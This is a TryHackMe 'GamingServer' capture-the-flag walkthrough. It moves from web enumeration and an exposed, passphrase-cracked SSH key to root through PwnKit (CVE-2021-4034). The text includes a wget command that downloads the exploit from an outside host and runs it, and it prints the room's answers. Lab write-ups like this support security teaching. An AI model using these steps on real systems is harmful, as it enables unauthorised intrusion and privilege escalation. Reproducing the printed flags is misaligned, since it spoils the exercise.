---
title: 'TryHackMe - GamingServer'
author: r2cook
categories: [TryHackMe]
tags: [ Steganography, ssh, ssh2john, john, PrivEsc, pkexec, PwnKit]
render_with_liquid: false
media_subpath: /images/thm/GamingServer/
image:
  path: room_card.jpeg
---

> In this walkthrough, we compromise the TryHackMe **GamingServer** machine by combining **web enumeration, hidden asset discovery, credential recovery, secure-shell foothold acquisition, and Linux privilege escalation**, progressing from subtle web clues to full root compromise while capturing both flags.

## Initial Setup

Add the target to your hosts file:

```plaintext
10.128.129.65 gaming.thm
```
{: file="/etc/hosts" }

---

## Enumeration

### Full Port Scan

```shell
nmap -p- -sV -sC -Pn --min-rate 1000 -oN full_nmap_scan.txt gaming.thm
```
{: .nolineno }

### Scan Results

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-31 01:27 EET
Nmap scan report for gaming.thm (10.128.129.65)
Host is up (0.057s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Key Findings

- **SSH** → `22/tcp`
    
- **HTTP** → `80/tcp`
    
- Web title reveals **"House of danak"**, suggesting a themed or custom site.
    

---

## Web Enumeration

![](Image_1.png){: width="800" height="400" .shadow }

![](Image_6.png){: width="800" height="400" .shadow }

While viewing the page source, we discover an interesting HTML comment:

```html
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

This strongly suggests that **`john`** is a valid username, which may become useful later during SSH enumeration.

![[THM/GamingServer/images/Image_2.png]]

### robots.txt

```text
user-agent: *
Allow: /
/uploads/
```

The `/uploads/` directory is publicly accessible.

---

## Inspecting `/uploads`

Browsing the uploads folder reveals **three files**:

- `dict.lst`
    
- `manifesto.txt`
    
- `meme.jpg`
    
![](Image_3.png){: width="800" height="400" .shadow }

The presence of an image plus a custom wordlist strongly hints at **steganography**, so the first logical step is to test the image.

### Steganography Attempt

```shell
stegseek meme.jpg dict.lst
```
{: .nolineno }

Output:

```text
[!] error: Could not find a valid passphrase.
```

No hidden content was recovered from the image using the supplied wordlist.

---

## Directory Fuzzing

Next, perform content discovery:

```shell
ffuf -u http://gaming.thm/FUZZ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
  -e .php,.txt,.zip,.old,.log \
  -mc 200,204,301,302,307,401,403 -c | tee ffuf_result.txt
```
{: .nolineno }

### Interesting Results

- `about.php`
    
- `robots.txt`
    
- `uploads/`
    
- **`secret/`** ← most interesting
    

The `/secret` endpoint stands out as the most promising lead.

---

## Secret Directory Discovery

Navigating to `/secret` reveals a single file:

- `secretKey`
    
![](Image_4.png){: width="800" height="400" .shadow }

Download the file and inspect it.

![](Image_5.png){: width="800" height="400" .shadow }

Save it as an SSH private key:

```shell
cat secretKey > id_rsa
chmod 700 id_rsa
```
{: .nolineno }

Trying to extract the public key shows that the key is **passphrase protected**:

```shell
ssh-keygen -y -f id_rsa
Enter passphrase for "id_rsa":
```
{: .nolineno }

---

## Cracking the SSH Key Passphrase

Convert the private key into a crackable hash:

```shell
~/tools/john/run/ssh2john.py id_rsa > key.hash
```
{: .nolineno }

Crack it using the previously discovered `dict.lst`:

```shell
~/tools/john/run/john key.hash --wordlist=dict.lst
```
{: .nolineno }

### Password Found

```text
letmein        (id_rsa)
```

The SSH key passphrase is:

```text
letmein
```

---

## Initial Access (SSH)

Using the earlier discovered username **`john`** and the cracked private key:

```shell
ssh -i id_rsa john@gaming.thm
```
{: .nolineno }

After entering the passphrase `letmein`, access is granted.

### User Flag

```shell
cat user.txt
```
{: .nolineno }

```text
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```
![](Image_7.png){: width="800" height="400" .shadow }

---

## Privilege Escalation (PrivEsc)

Enumerate SUID binaries:

```shell
find / -perm -4000 -type f 2>/dev/null
```
{: .nolineno }

Among the standard binaries, one critical finding stands out:

- `/usr/bin/pkexec`
    

Check the version:

```shell
/usr/bin/pkexec --version
```
{: .nolineno }

```text
pkexec version 0.105
```

This version is vulnerable to **PwnKit (CVE-2021-4034)**.

---

## Exploiting PwnKit

Transfer the exploit to the target:

```shell
cd /tmp
wget http://192.168.145.29:8000/PwnKit
chmod +x PwnKit
./PwnKit
```
{: .nolineno }

Successful exploitation drops us into a **root shell**:

```shell
root@exploitable:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```
{: .nolineno }

---

## Root Flag

```shell
cat /root/root.txt
```
{: .nolineno }

```text
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```

---

# 🏆 Final Flags

- **User:** `a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e`
    
- **Root:** `2e337b8c9f3aff0c2b3e8d4e6a7c88fc`
    

---